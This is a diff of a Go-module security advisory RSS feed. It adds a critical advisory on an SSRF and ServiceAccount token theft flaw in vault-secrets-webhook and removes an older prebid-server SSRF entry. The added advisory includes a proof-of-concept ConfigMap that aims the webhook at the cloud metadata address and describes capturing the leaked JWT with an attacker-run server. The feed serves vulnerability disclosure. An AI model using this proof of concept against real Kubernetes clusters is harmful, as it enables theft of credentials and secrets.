@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-07-31T17:16:58.935Z</updated>
+    <updated>2026-07-31T19:05:47.046Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,75 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/bank-vaults/vault-secrets-webhook] vault-addr annotation SSRF -- webhook makes outbound HTTP call to attacker URL during admission; vault-serviceaccount enables cluster-wide SA token theft via TokenRequest API]]></title>
+        <id>https://github.com/advisories/GHSA-r2v3-8gwf-7ghm</id>
+        <link href="https://github.com/advisories/GHSA-r2v3-8gwf-7ghm"/>
+        <updated>2026-07-31T17:45:04.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The vault-secrets-webhook reads the <code>vault.security.banzaicloud.io/vault-addr</code> annotation from any ConfigMap or Secret being admitted and uses it as the Vault server address without any validation or allowlist. When a ConfigMap or Secret contains a value prefixed with <code>vault:</code>, the webhook's admission handler synchronously calls the Vault API at the attacker-supplied address from inside the webhook process during the admission review. The webhook additionally grants <code>serviceaccounts/token:create</code> cluster-wide, and the <code>vault-serviceaccount</code> annotation controls which ServiceAccount's JWT is fetched and sent to that address. An attacker who can create ConfigMaps or Secrets in a watched namespace can cause the webhook process to make arbitrary outbound HTTP connections and exfiltrate ServiceAccount JWTs.</p>
+<h2 id="details">Details</h2>
+<p><code>parseVaultConfig()</code> at <code>pkg/webhook/config.go:102-107</code> reads <code>VaultAddrAnnotation</code> unconditionally into <code>vaultConfig.Addr</code>:</p>
+<pre><code class="language-go">if value, ok := annotations[common.VaultAddrAnnotation]; ok {
+    vaultConfig.Addr = value
+}
+</code></pre>
+<p>No URL scheme validation, no hostname allowlist, no RFC-1918 or link-local filter.</p>
+<p><code>MutateConfigMap</code> and <code>MutateSecret</code> at <code>pkg/webhook/configmap.go</code> and <code>pkg/webhook/secret.go</code> call <code>mw.newVaultClient(ctx, vaultConfig)</code> when the object contains at least one <code>vault:...</code> value. Inside <code>newVaultClient</code>, at <code>pkg/webhook/webhook.go:285</code>:</p>
+<pre><code class="language-go">clientConfig.Address = vaultConfig.Addr
+</code></pre>
+<p><code>vault.NewClientFromConfigWithContext</code> then opens an HTTP connection to the attacker-controlled address from the webhook server process, synchronously during the admission review. This is not deferred to a separate pod.</p>
+<p>The <code>vault-skip-verify</code> annotation (<code>pkg/webhook/config.go:197</code>) sets <code>InsecureSkipVerify: true</code> on the TLS config, eliminating the need for a valid certificate on the attacker's server.</p>
+<p>When <code>VaultServiceaccountAnnotation</code> is also set, at <code>pkg/webhook/webhook.go</code>:</p>
+<pre><code class="language-go">mw.k8sClient.CoreV1().ServiceAccounts(vaultConfig.ObjectNamespace).CreateToken(
+    ctx, saName, &amp;tokenRequest, metav1.CreateOptions{})
+</code></pre>
+<p>The webhook's ClusterRole (<code>deploy/charts/vault-secrets-webhook/templates/webhook-rbac.yaml</code>) grants <code>serviceaccounts/token:create</code> cluster-wide. The resulting JWT is then POSTed to <code>vaultConfig.Addr/v1/auth/&lt;path&gt;/login</code>. An attacker intercepts this JWT and replays it against the real Vault to access secrets bound to that ServiceAccount's Vault role.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Create a ConfigMap in any watched namespace:</p>
+<pre><code class="language-yaml">apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: ssrf-poc
+  namespace: tenant-ns
+  annotations:
+    vault.security.banzaicloud.io/vault-addr: "http://169.254.169.254/latest/meta-data/"
+    vault.security.banzaicloud.io/vault-skip-verify: "true"
+    vault.security.banzaicloud.io/vault-serviceaccount: "high-priv-sa"
+data:
+  secret-key: "vault:secret/data/test#value"
+</code></pre>
+<p>When this ConfigMap is created, the vault-secrets-webhook admission handler:</p>
+<ol>
+<li>Parses the annotations and reads <code>vault-addr: http://169.254.169.254/latest/meta-data/</code></li>
+<li>Calls <code>CoreV1().ServiceAccounts(tenant-ns).CreateToken(ctx, "high-priv-sa", ...)</code> using cluster-wide <code>serviceaccounts/token:create</code></li>
+<li>Calls <code>vault.NewClientFromConfigWithContext</code> which POSTs the JWT to <code>http://169.254.169.254/latest/meta-data/v1/auth/kubernetes/login</code></li>
+<li>On AWS EKS with IMDSv1, the cloud metadata service receives the request from the webhook pod's IAM identity</li>
+</ol>
+<p>For the SA token theft path: run an HTTP server at the attacker-controlled <code>vault-addr</code> to capture the <code>Authorization: Bearer &lt;JWT&gt;</code> header from the login POST.</p>
+<h2 id="impact">Impact</h2>
+<p>A user with <code>create</code> or <code>update</code> on ConfigMaps or Secrets in any namespace watched by the vault-secrets-webhook can:</p>
+<ol>
+<li>Cause the webhook process (a cluster-wide privileged component) to make arbitrary outbound HTTP connections to any address including cloud IMDS</li>
+<li>Exfiltrate ServiceAccount JWTs for any SA in their namespace, which can be replayed against the real Vault server to read secrets the SA's role is authorized to access</li>
+</ol>
+<p>The attack happens at admission time in the webhook server process, not in a user pod, and requires no special privileges beyond ConfigMap or Secret create/update rights.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/bank-vaults/vault-secrets-webhook/security/advisories/GHSA-r2v3-8gwf-7ghm">https://github.com/bank-vaults/vault-secrets-webhook/security/advisories/GHSA-r2v3-8gwf-7ghm</a></li>
+<li><a href="https://github.com/bank-vaults/vault-secrets-webhook/commit/76db45976fee0f54cafd94dffa425e6b542f65a0">https://github.com/bank-vaults/vault-secrets-webhook/commit/76db45976fee0f54cafd94dffa425e6b542f65a0</a></li>
+<li><a href="https://github.com/bank-vaults/vault-secrets-webhook/releases/tag/v1.23.1">https://github.com/bank-vaults/vault-secrets-webhook/releases/tag/v1.23.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-r2v3-8gwf-7ghm">https://github.com/advisories/GHSA-r2v3-8gwf-7ghm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-r2v3-8gwf-7ghm</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-31T17:45:02.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/projectcapsule/capsule] Capsule has an incomplete fix of CVE-2026-22872: TenantResource RawItems and Generators still allow cluster-scoped resource creation (cross-tenant privilege escalation)]]></title>
         <id>https://github.com/advisories/GHSA-jr6p-8pjj-mfx6</id>
@@ -1328,33 +1397,5 @@ This allows users to claim ownership of an email or phone they do not control an
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-07-29T16:54:49.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/prebid/prebid-server] prebid-server's request forgery vulnerability allows for possible host environment data extraction]]></title>
-        <id>https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</id>
-        <link href="https://github.com/advisories/GHSA-4p3g-4hcj-wpvx"/>
-        <updated>2026-07-29T16:00:36.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Certain bidder adapters accept user-supplied parameters that are interpolated into outbound request URLs. Without proper input validation, a malicious actor could craft bid request parameters that cause the server to send HTTP requests to unintended destinations, potentially exposing internal network services or sensitive server endpoints to unauthorized access.</p>
-<h3 id="patches">Patches</h3>
-<p>Patched in <a href="https://github.com/prebid/prebid-server/releases/tag/v4.4.0">v4.4.0</a></p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If one is unable to update, please make sure that the affected bidder adapters are disabled.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/prebid/prebid-server/security/advisories/GHSA-4p3g-4hcj-wpvx">https://github.com/prebid/prebid-server/security/advisories/GHSA-4p3g-4hcj-wpvx</a></li>
-<li><a href="https://github.com/prebid/prebid-server/pull/4802">https://github.com/prebid/prebid-server/pull/4802</a></li>
-<li><a href="https://github.com/prebid/prebid-server/commit/494ac271cd4b5024df9123ef25ca3cff96390be3">https://github.com/prebid/prebid-server/commit/494ac271cd4b5024df9123ef25ca3cff96390be3</a></li>
-<li><a href="https://github.com/prebid/prebid-server/releases/tag/v4.4.0">https://github.com/prebid/prebid-server/releases/tag/v4.4.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-4p3g-4hcj-wpvx">https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-29T16:00:36.000Z</published>
     </entry>
 </feed>
